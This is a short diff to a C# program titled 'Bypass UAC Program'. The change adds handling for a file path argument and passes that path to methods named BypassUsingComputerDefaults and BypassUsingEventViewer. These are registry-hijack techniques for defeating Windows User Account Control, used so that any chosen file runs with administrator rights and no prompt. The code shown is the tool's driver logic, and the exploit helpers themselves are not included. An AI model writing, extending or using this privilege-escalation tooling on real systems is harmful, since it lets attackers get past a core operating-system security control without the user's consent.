@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.IO;
 namespace UACBypass
 {
     class Program
@@ -12,6 +13,18 @@ namespace UACBypass
         {
             try
             {
+                string filename = null;
+                string current_filename = System.Reflection.Assembly.GetExecutingAssembly().Location + (args.Length > 0 ? " " + args[0] : null);
+                if (args.Length > 0)
+                {
+                    if (File.Exists(args[0]))
+                    {
+                        filename = args[0];
+                    }
+                    else throw new Exception(args[0] + " not found");
+                }
+                else filename = current_filename;
+
                 Console.Title = "Bypass UAC Program @Régiolis 2022";
 
                 UAC.CleanRegistry();
@@ -28,11 +41,11 @@ namespace UACBypass
                     if (UAC.IsUACDisabled()) UAC.RestartAsAdmin();
                     else
                     {
-                        string filename = System.Reflection.Assembly.GetExecutingAssembly().Location + (args.Length > 0 ? " " + args[0] : null);
+                        string fullpath = current_filename != filename ? current_filename + " " + filename : filename;
 
                         if (OsSupport.IsEightOrBetter)
-                            UAC.BypassUsingComputerDefaults(filename);
-                        else UAC.BypassUsingEventViewer(filename);
+                            UAC.BypassUsingComputerDefaults(fullpath);
+                        else UAC.BypassUsingEventViewer(fullpath);
                     }
                 }
                 else if (Privileges.IsRunningAsSystem())
